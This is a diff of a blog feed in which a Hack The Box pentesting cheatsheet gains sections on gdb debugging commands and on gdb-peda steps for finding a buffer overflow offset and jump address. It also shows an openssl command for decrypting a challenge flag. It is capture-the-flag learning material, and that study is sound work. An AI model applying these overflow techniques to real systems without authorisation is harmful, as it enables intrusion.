xml:base="https://www.agalera.eu/pentesting-playbook/">&lt;p&gt;I have started playing around in &lt;a href=&quot;https://www.hackthebox.com/&quot;&gt;https://www.hackthebox.com&lt;/a&gt; platform and I’ll use this article to save all the steps I take to complete the challenges.&lt;/p&gt;
 
 &lt;p&gt;&lt;!--more--&gt;&lt;/p&gt;
 
@@ -882,7 +1081,32 @@ Shellcodes: No Results
 &lt;p&gt;To decypher the file encrypted with the private key use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;openssl&lt;/code&gt;:&lt;/p&gt;
 
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;openssl rsautl -in flag.enc -out flag.txt -decrypt -inkey key.priv
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="pentesting" /><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="pentesting" /><summary type="html">I have started playing around in https://www.hackthebox.com platform and I’ll use this article to save all the pentesting tools I am learning.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" /><media:content medium="image" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Python app structure</title><link href="https://www.agalera.eu/python-app-structure/" rel="alternate" type="text/html" title="Python app structure" /><published>2022-12-13T00:00:00+01:00</published><updated>2022-12-13T00:00:00+01:00</updated><id>https://www.agalera.eu/python-app-structure</id><content type="html" xml:base="https://www.agalera.eu/python-app-structure/">&lt;p&gt;Recently I was starting a Python application project from scratch and I had some issues understanding the correct project structure. Here’s what I have learnt.&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;gdb&quot;&gt;gdb&lt;/h2&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gdb&lt;/code&gt; is the GNU debugger. See the following operations:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Set a breakpoint: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;b *0x08049291&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Run the program: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Run program with input: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r &amp;lt; pattern.txt&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Continue the execution after breakpoint: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;c&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Show file information: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;info file&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Show stack: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;x/60x $esp&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;gdb-peda&quot;&gt;gdb-peda&lt;/h2&gt;
+
+&lt;p&gt;Python Exploit Development Assistance for GDB&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/longld/peda&quot;&gt;https://github.com/longld/peda&lt;/a&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Create a pattern of 200 chars: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pattern_create 200 bof.txt&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Calculate the number of characters to do buffer overflow: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pattern_offset &amp;lt;EIP register&amp;gt;&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Get assembler code for function: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;disas &amp;lt;function&amp;gt;&lt;/code&gt;. The first line shows the address you must use to jump&lt;/li&gt;
+&lt;/ul&gt;</content><author><name></name></author><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="pentesting" /><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="pentesting" /><summary type="html">I have started playing around in https://www.hackthebox.com platform and I’ll use this article to save all the pentesting tools I am learning.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" /><media:content medium="image" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Python app structure</title><link href="https://www.agalera.eu/python-app-structure/" rel="alternate" type="text/html" title="Python app structure" /><published>2022-12-13T00:00:00+01:00</published><updated>2022-12-13T00:00:00+01:00</updated><id>https://www.agalera.eu/python-app-structure</id><content type="html" xml:base="https://www.agalera.eu/python-app-structure/">&lt;p&gt;Recently I was starting a Python application project from scratch and I had some issues understanding the correct project structure. Here’s what I have learnt.&lt;/p&gt;
 
 &lt;p&gt;&lt;!--more--&gt;&lt;/p&gt;
 
